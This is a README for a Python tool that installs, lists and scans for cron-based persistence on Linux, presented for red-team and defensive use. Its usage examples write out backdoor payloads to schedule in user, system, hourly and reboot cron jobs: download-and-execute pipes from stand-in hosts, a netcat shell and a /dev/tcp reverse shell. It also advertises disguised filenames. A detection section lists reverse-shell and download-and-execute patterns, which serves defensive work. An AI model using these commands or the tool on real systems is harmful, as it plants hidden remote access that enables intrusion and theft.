# CronPersistence – Linux Cron-Based Persistence Framework

**A modular, clean, and professional Python tool for establishing, detecting, and analyzing cron-based persistence on Linux systems.**

Originally built for red team engagements and penetration testing, this refactored version is organized as a proper Python package with separation of concerns, making it suitable for both offensive security tooling and defensive detection/hunting.

> **Legal Disclaimer**  
> This tool is intended for authorized security testing, red team operations, and defensive research only.  
> Use on systems without explicit permission is illegal. The authors and contributors assume no liability for misuse.

---

### Features

- Multiple persistence techniques:
  - User crontab (`*/n * * * *`)
  - System-wide `/etc/cron.d/` jobs (root)
  - `/etc/cron.hourly/` and `/etc/cron.daily/` scripts (root)
  - `@reboot` persistence
- Stealthy naming using random legitimate-looking filenames
- Built-in detection & hunting capabilities
- Suspicious cron entry scanner
- Clean removal commands returned after installation
- Fully modular and extensible design

---

### Project Structure

```
cron_persistence/
├── cron_persistence/
│   ├── core.py
│   ├── utils/helpers.py
│   ├── persistence/
│   │   ├── user_cron.py
│   │   ├── system_cron.py
│   │   ├── hourly_daily.py
│   │   └── reboot_cron.py
│   ├── detection/scanner.py
│   └── cli.py
├── scripts/cronpersistence          # Main executable
├── README.md
└── requirements.txt
```

---

### Installation

```bash
# Clone the repository
git clone https://github.com/yourusername/cronpersistence.git
cd cronpersistence

# Option 1: Run directly (recommended)
chmod +x scripts/cronpersistence
sudo cp scripts/cronpersistence /usr/local/bin/cronpersistence   # optional: global install

# Option 2: Install as Python package (editable mode)
pip3 install -e .

# Then run
cronpersistence --help
```

> Root privileges are required for system-level persistence (`--install-system`, `--install-hourly`, `--install-daily`)

---

### Usage Examples

```bash
# List all cron jobs on the system
cronpersistence --list

# Scan for suspicious/malicious cron entries
cronpersistence --check-suspicious

# Install user-level persistence (every 15 minutes)
cronpersistence --install-user "curl -fsSL https://evil.example/sh | bash" --interval 15

# Install system-wide persistence via /etc/cron.d/ (root required)
sudo cronpersistence --install-system "nc -e /bin/bash attacker.example.com 4444"

# Install hourly backdoor script
sudo cronpersistence --install-hourly "/bin/bash -i >& /dev/tcp/10.10.10.10/9001 0>&1"

# Install daily persistence
sudo cronpersistence --install-daily "python3 /tmp/rev.py"

# Run payload on every system reboot
cronpersistence --install-reboot "sleep 30 && wget -O- http://c2.example/beacon | bash"
```

---

### Output Example

```text
[*] Installing user cron persistence for alice...
[*] Interval: Every 10 minutes
[+] User cron persistence installed successfully
{
  'method': 'user_cron',
  'user': 'alice',
  'interval': 10,
  'payload': 'curl -fsSL http://c2/payload.sh | sh',
  'remove_command': 'crontab -l | grep -v "c2/payload.sh" | crontab -'
}
```

Use the `remove_command` to clean up after testing!

---

### Defensive Use (Blue Team / Hunting)

```bash
# Hunt for common red team persistence patterns
cronpersistence --check-suspicious

# Full system cron audit
cronpersistence --list
```

Detects patterns like:
- Reverse shells (`nc`, `netcat`, `/dev/tcp`)
- Download-and-execute (`curl|wget ... |sh`)
- Suspicious paths (`/tmp/`, `/dev/shm/`)
- Encoded payloads (`base64`, `eval`)

---

### Contributing

Contributions are welcome! Feel free to:
- Add new persistence methods (systemd timers, anacron, etc.)
- Improve detection rules
- Add logging / JSON output mode
- Write tests

Please open an issue first for major changes.

---

### Author & License

Created for educational and authorized security testing purposes.

**License**: MIT License (except where use violates law)

> Use responsibly. Stay legal. Happy hacking (with permission)!